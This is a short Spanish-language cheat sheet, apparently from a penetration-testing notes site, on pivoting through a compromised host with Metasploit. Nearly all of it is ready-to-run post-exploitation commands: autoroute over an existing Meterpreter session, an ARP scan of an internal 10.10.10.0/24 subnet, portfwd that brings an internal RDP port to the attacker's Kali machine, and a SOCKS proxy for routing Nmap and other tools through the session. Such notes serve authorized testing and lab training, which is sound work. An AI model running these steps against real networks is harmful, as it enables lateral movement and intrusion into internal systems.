---
title: "Metasploit Pivoting (Autoroute)"
layout: "single"
category: "Pivoting"
slug: "pivoting/metasploit"
date: "2025-11-26"
---

Si ya tienes una sesión de **Meterpreter**, es muy cómodo usar esto.

### 1. Enrutar Tráfico (Autoroute)
Hace que Metasploit "conozca" la red interna a través de la sesión comprometida.

```bash
# Opción 1: Desde una sesión activa
meterpreter > run post/multi/manage/autoroute

# Opción 2: Desde fuera
use multi/manage/autoroute
set SESSION 1
run
```

**Verificar rutas:**
```bash
meterpreter > run autoroute -p
```

### 2. Descubrimiento de Hosts (ARP Scanner)
Si estás en una máquina Windows, usa el módulo ARP para ver vecinos.
```bash
use windows/gather/arp_scanner
set RHOSTS 10.10.10.0/24
set SESSION 1
run
```

### 3. Port Forwarding (Portfwd)
Traer un puerto específico a tu Kali sin usar proxychains.

```bash
# Traer el puerto 3389 (RDP) de la IP interna (10.10.10.5) a mi puerto local 3389
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
```
*Ahora conecta: `xfreerdp /v:127.0.0.1 ...`*

### 4. SOCKS Proxy (Auxiliary)
Para usar herramientas externas (Nmap/Firefox) a través de la sesión de Metasploit.

```bash
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
run
```
*Configura proxychains al puerto 9050.*
